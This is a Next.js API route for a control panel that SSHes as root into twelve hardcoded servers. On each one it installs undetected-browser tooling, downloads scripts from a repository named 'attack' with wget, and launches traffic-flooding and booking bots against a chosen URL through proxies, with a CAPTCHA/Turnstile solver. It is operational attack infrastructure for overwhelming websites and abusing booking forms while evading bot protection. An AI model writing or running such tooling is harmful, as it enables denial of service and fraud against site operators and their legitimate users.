import { NextResponse } from 'next/server';
import { Client } from 'ssh2';

const DEFAULT_SERVERS = [
  { host: '142.93.41.217', username: 'root' },
  { host: '167.99.94.250', username: 'root' },
  { host: '165.22.118.138', username: 'root' },
  { host: '138.68.177.243', username: 'root' },
  { host: '167.172.61.206', username: 'root' },
  { host: '46.101.87.130', username: 'root' },
  { host: '138.68.181.63', username: 'root' },
  { host: '161.35.170.149', username: 'root' },
  { host: '165.232.43.207', username: 'root' },
  { host: '178.62.101.245', username: 'root' },
  { host: '138.68.141.39', username: 'root' },
  { host: '157.245.47.200', username: 'root' }
];

// v17 Setup: install pip3 + patchright (undetected) + playwright (fallback) + Xvfb + all system deps
// Compatible with Ubuntu 22.04 (libasound2) and 24.04 (libasound2t64)
const SETUP_COMMAND = `export DEBIAN_FRONTEND=noninteractive && \
apt-get update -qq && apt-get install -y -qq python3-pip libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libpango-1.0-0 libcairo2 libxshmfence1 xvfb 2>/dev/null; \
apt-get install -y -qq libasound2t64 2>/dev/null || apt-get install -y -qq libasound2 2>/dev/null; \
pip3 install patchright curl_cffi 'python-socketio[client]' websocket-client requests playwright --break-system-packages -q 2>/dev/null; \
pip3 install patchright curl_cffi 'python-socketio[client]' websocket-client requests playwright -q 2>/dev/null; \
python3 -m patchright install chromium 2>/dev/null; \
python3 -m playwright install chromium 2>/dev/null; \
python3 -m playwright install-deps 2>/dev/null; \
(pgrep -f 'Xvfb :99' || nohup Xvfb :99 -screen 0 1920x1080x24 -nolisten tcp > /dev/null 2>&1 &); \
echo SETUP_COMPLETE_V17`;

function sanitizeUrl(url) {
  if (!url || typeof url !== 'string') return null;
  if (!/^https?:\/\//i.test(url)) return null;
  if (/[;&|$(){}!#\n\r\\]/.test(url)) return null;
  if (/['"]/.test(url)) return null;
  return url.trim();
}

function sanitizeNumber(val, defaultVal, min, max) {
  const num = parseInt(val);
  if (isNaN(num) || num < min || num > max) return defaultVal;
  return num;
}

function validateApiKey(req) {
  const authHeader = req.headers.get('x-api-key') || '';
  const validKey = process.env.PANEL_API_KEY;
  if (!validKey || authHeader !== validKey) return false;
  return true;
}

async function runSSHCommand(server, command, timeout = 8000) {
  return new Promise((resolve) => {
    const conn = new Client();
    let output = '';
    let resolved = false;

    const done = (result) => {
      if (!resolved) {
        resolved = true;
        try { conn.end(); } catch(e) {}
        resolve(result);
      }
    };

    const timer = setTimeout(() => {
      done({ status: 'success', output: output.trim() || 'Command sent (timeout)' });
    }, timeout);

    conn.on('ready', () => {
      conn.exec(command, { pty: false }, (err, stream) => {
        if (err) {
          clearTimeout(timer);
          return done({ status: 'error', error: err.message });
        }
        stream.on('data', (data) => { output += data.toString(); });
        stream.stderr.on('data', (data) => { output += data.toString(); });
        stream.on('close', () => {
          clearTimeout(timer);
          done({ status: 'success', output: output.trim() || 'Done' });
        });
      });
    });

    conn.on('error', (err) => {
      clearTimeout(timer);
      done({ status: 'error', error: err.message });
    });

    conn.connect({
      host: server.host,
      port: 22,
      username: server.username,
      password: process.env.VPS_PASSWORD,
      readyTimeout: 5000,
      keepaliveInterval: 3000,
    });
  });
}

export async function POST(req) {
  if (!validateApiKey(req)) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  try {
    const { action, url, durationMin, servers, proxies, waveSize, stayTime, socketUrl, captchaApiKey, captchaService, forceMode, forceProtection, instances } = await req.json();
    const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;

    if (action === 'setup') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `nohup bash -c '${SETUP_COMMAND}' > /root/setup.log 2>&1 & echo "Setup started (v10)"`, 8000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy') {
      // Download all 3 script files + turnstile solver directly on each server from GitHub
      const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attack/main';
      const ghBaseReg = 'https://raw.githubusercontent.com/fanarali881-eng/attackreg/main';
      const files = ['visit.py', 'browser_engine.py', 'detection_engine.py'];
      const downloadCmds = files.map(f => 
        `wget -q -O /root/${f} '${ghBase}/${f}'`
      ).join(' && ');
      const deployCmd = `${downloadCmds} && wget -q -O /root/turnstile_solver.py '${ghBaseReg}/turnstile_solver.py' && wc -c /root/visit.py /root/browser_engine.py /root/detection_engine.py /root/turnstile_solver.py && echo "Script v14 deployed (4 files + Turnstile solver)"`;
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, deployCmd, 30000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'deploy-sesallameh' || action === 'deploy-smart') {
      // Deploy the smart/sesallameh booking bot script + turnstile solver to all servers
      const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attackreg/main';
      const deployCmd = `wget -q -O /root/sesallameh_bot.py '${ghBase}/sesallameh_bot.py' && wget -q -O /root/smart_bot.py '${ghBase}/smart_bot.py' && wget -q -O /root/turnstile_solver.py '${ghBase}/turnstile_solver.py' && wc -c /root/sesallameh_bot.py /root/smart_bot.py /root/turnstile_solver.py && echo "Smart bot + Turnstile solver deployed"`;
      
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, deployCmd, 30000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start-sesallameh') {
      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
      const safeInstances = sanitizeNumber(instances, 3, 1, 10);

      // Build proxy env vars
      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }

      const results = await Promise.all(
        serverList.map(async (server) => {
          const fullCmd = `kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; sleep 1; ` +
            `${proxyEnv} nohup python3 /root/sesallameh_bot.py ${safeDuration} ${safeInstances} > /root/sesallameh.log 2>&1 & ` +
            `echo "Sesallameh bot started - ${safeDuration}min ${safeInstances} instances"`;
          
          const r = await runSSHCommand(server, fullCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start-smart') {
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
      const safeInstances = sanitizeNumber(instances, 3, 1, 10);

      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }

      const results = await Promise.all(
        serverList.map(async (server) => {
          const escapedUrl = safeUrl.replace(/'/g, "'\\''");
          // Build env var string for inline use (DISPLAY=:99 for Turnstile solver Xvfb)
          let envStr = 'PYTHONUNBUFFERED=1 DISPLAY=:99';
          if (proxies && proxies.length > 0) {
            let p = proxies[0];
            // Parse proxy URL string like http://user:pass@host:port
            let pUser = '', pPass = '', pHost = 'proxy.packetstream.io', pPort = '31112';
            if (typeof p === 'string') {
              try {
                const proxyUrl = new URL(p);
                pUser = decodeURIComponent(proxyUrl.username || '');
                pPass = decodeURIComponent(proxyUrl.password || '');
                pHost = proxyUrl.hostname || 'proxy.packetstream.io';
                pPort = proxyUrl.port || '31112';
              } catch(e) {
                // Fallback: try regex
                const m = p.match(/\/\/([^:]+):([^@]+)@([^:]+):(\d+)/);
                if (m) { pUser = m[1]; pPass = m[2]; pHost = m[3]; pPort = m[4]; }
              }
            } else {
              pUser = p.username || ''; pPass = p.password || ''; pHost = p.host || 'proxy.packetstream.io'; pPort = p.port || '31112';
            }
            envStr += ` PROXY_USER=${pUser.replace(/[^a-zA-Z0-9_@.-]/g, '')}`;
            envStr += ` PROXY_PASS=${pPass.replace(/[^a-zA-Z0-9_@.#!-]/g, '')}`;
            envStr += ` PROXY_HOST=${pHost.replace(/[^a-zA-Z0-9_.-]/g, '')}`;
            envStr += ` PROXY_PORT=${pPort.toString().replace(/[^0-9]/g, '')}`;
          }
          
          // Step 0: Ensure Xvfb is running for Turnstile solver
          await runSSHCommand(server, 'pgrep -f "Xvfb :99" || nohup Xvfb :99 -screen 0 1920x1080x24 -nolisten tcp > /dev/null 2>&1 &', 5000);
          
          // Step 1: Kill old processes
          await runSSHCommand(server, 'kill -9 $(pgrep -f smart_bot.py) 2>/dev/null; screen -X -S smartbot quit 2>/dev/null; rm -f /root/smart_bot.log', 5000);
          
          // Step 1.5: Always pull latest smart_bot.py from GitHub before starting (cache-bust with timestamp)
          await runSSHCommand(server, `wget -q --no-cache -O /root/smart_bot.py 'https://raw.githubusercontent.com/fanarali881-eng/attackreg/main/smart_bot.py?t=${Date.now()}' && wc -c /root/smart_bot.py && echo 'Latest smart_bot.py pulled from GitHub'`, 15000);
          
          // Step 2: Launch directly with screen - no script file needed
          const launchCmd = `screen -dmS smartbot bash -c "${envStr} python3 -u /root/smart_bot.py ${safeUrl} ${safeDuration} ${safeInstances} > /root/smart_bot.log 2>&1"`;
          await runSSHCommand(server, launchCmd, 5000);
          
          // Step 3: Verify it started
          const r = await runSSHCommand(server, 'sleep 2; screen -ls 2>&1; pgrep -f smart_bot.py > /dev/null && echo BOT_STARTED || echo BOT_FAILED', 10000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop-sesallameh' || action === 'stop-smart') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const killScript = 'killall -9 python3 2>/dev/null; killall -9 chromium 2>/dev/null; killall -9 patchright 2>/dev/null; screen -X -S smartbot quit 2>/dev/null; screen -wipe 2>/dev/null; sleep 1; killall -9 python3 2>/dev/null; killall -9 chromium 2>/dev/null; echo Bot_stopped';
          const r = await runSSHCommand(server, killScript, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'status-sesallameh' || action === 'status-smart') {
      const statusFile = action === 'status-smart' ? 'smart_bot_status.json' : 'sesallameh_status.json';
      const procName = action === 'status-smart' ? 'smart_bot.py' : 'sesallameh_bot.py';
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `cat /root/${statusFile} 2>/dev/null || echo "{}"; echo "---"; ps aux | grep ${procName} | grep -v grep | grep -v bash > /dev/null && echo "RUNNING" || echo "STOPPED"`, 10000);
          return { host: server.host, ...r };
        })
      );
      
      // Parse status from each server
      const parsed = results.map(r => {
        let status = { status: 'unknown', bookings: 0, errors: 0, elapsed: 0 };
        let running = false;
        if (r.output) {
          const parts = r.output.split('---');
          try {
            const jsonPart = parts[0].trim();
            if (jsonPart && jsonPart !== '{}') {
              status = JSON.parse(jsonPart);
            }
          } catch(e) {}
          running = r.output.includes('RUNNING');
        }
        return {
          host: r.host,
          status: r.status === 'error' ? 'error' : (running ? 'running' : 'stopped'),
          bookings: status.bookings || status.submissions || 0,
          errors: status.errors || 0,
          elapsed: status.elapsed || 0,
          target_url: status.target_url || '',
          recent: status.recent || [],
          error: r.error
        };
      });
      
      return NextResponse.json({ results: parsed });

    } else if (action === 'test-smart') {
      // Run smart bot for a quick test and capture output
      const results = await Promise.all(
        serverList.slice(0, 1).map(async (server) => {
          const r = await runSSHCommand(server, `echo '===RUN_SMART==='; cat /root/run_smart.sh 2>/dev/null || echo 'NO FILE'; echo '===LOG==='; cat /root/smart_bot.log 2>/dev/null || echo 'NO LOG'; echo '===PROCS==='; ps aux | grep smart_bot | grep -v grep; echo '===PGREP==='; pgrep -af smart_bot || echo 'NOT RUNNING'`, 15000);

          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'logs-smart') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, `grep -E "STEP 3b|commissioner fill|PRE-SUBMIT|commissionerName|commissionerPhone|commissionerIdNumber|VALIDATION|reactProps|fiber_i|events:|NOT_FOUND|v62|Submission" /root/smart_bot.log | tail -100 2>/dev/null || echo "No log"; echo "---FILE_SIZE---"; wc -c /root/smart_bot.py 2>/dev/null || echo "0"; echo "---PY_CHECK---"; python3 -c "from playwright.sync_api import sync_playwright; print('PW_OK')" 2>&1 | tail -1`, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'start') {
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
      
      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
      const safeWaveSize = sanitizeNumber(waveSize, 60, 10, 500);
      const safeStayTime = sanitizeNumber(stayTime, 35, 10, 120);

      // Build proxy env vars
      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }

      const results = await Promise.all(
        serverList.map(async (server) => {
          const escapedUrl = safeUrl.replace(/'/g, "'\\''");
          const fullCmd = `killall -9 python3 2>/dev/null; sleep 1; ` +
            `(pgrep -f 'Xvfb :99' || nohup Xvfb :99 -screen 0 1920x1080x24 -nolisten tcp > /dev/null 2>&1 &); sleep 1; ` +
            `for i in $(seq 1 20); do docker start flaresolverr$i 2>/dev/null; done; ` +
            `DISPLAY=:99 ${proxyEnv} WAVE_SIZE=${safeWaveSize} STAY_TIME=${safeStayTime} ` +
            (socketUrl ? `SOCKET_URL='${socketUrl.replace(/'/g, '')}' ` : '') +
            (captchaApiKey ? `CAPTCHA_API_KEY='${captchaApiKey.replace(/'/g, '')}' ` : '') +
            (captchaService ? `CAPTCHA_SERVICE='${captchaService.replace(/'/g, '')}' ` : '') +
            (forceMode ? `FORCE_MODE='${forceMode.replace(/'/g, '')}' ` : '') +
            (forceProtection ? `FORCE_PROTECTION='${forceProtection.replace(/'/g, '')}' ` : '') +
            `nohup python3 /root/visit.py '${escapedUrl}' ${safeDuration}` +
            (socketUrl ? ` '${socketUrl.replace(/'/g, '')}'` : '') +
            ` > /root/visit.log 2>&1 & ` +
            `echo "Started v12 - ${safeDuration}min WAVE=${safeWaveSize} STAY=${safeStayTime}s"`;
          
          const r = await runSSHCommand(server, fullCmd, 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'stop') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'status') {
      const results = await Promise.all(
        serverList.map(async (server) => {
          const r = await runSSHCommand(server, 'tail -5 /root/visit.log 2>/dev/null || echo "No log"; pgrep -f visit.py > /dev/null && echo "RUNNING" || echo "STOPPED"', 10000);
          return { host: server.host, ...r };
        })
      );
      return NextResponse.json({ results });

    } else if (action === 'scan') {
      // Quick scan from one server to detect site type
      const safeUrl = sanitizeUrl(url);
      if (!safeUrl) return NextResponse.json({ error: "Invalid URL" }, { status: 400 });
      
      const server = serverList[0];
      let proxyEnv = '';
      if (proxies && proxies.length > 0) {
        const p = proxies[0];
        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
      }
      
      const escapedUrl = safeUrl.replace(/'/g, "'\\''");
      const scanCmd = `${proxyEnv} python3 -c "
import sys; sys.path.insert(0,'/root')
exec(open('/root/visit.py').read().split('if __name__')[0])
import json
info = detect_site('${escapedUrl}')
print('SCAN_RESULT:' + json.dumps(info, ensure_ascii=False))
" 2>&1 | grep SCAN_RESULT | head -1`;
      
      const r = await runSSHCommand(server, scanCmd, 30000);
      
      let scanResult = null;
      if (r.output && r.output.includes('SCAN_RESULT:')) {
        try {
          const jsonStr = r.output.split('SCAN_RESULT:')[1].trim();
          scanResult = JSON.parse(jsonStr);
        } catch(e) {}
      }
      
      return NextResponse.json({ scanResult, raw: r.output, host: server.host });

    } else {
      return NextResponse.json({ error: "Unknown action" }, { status: 400 });
    }
  } catch (error) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
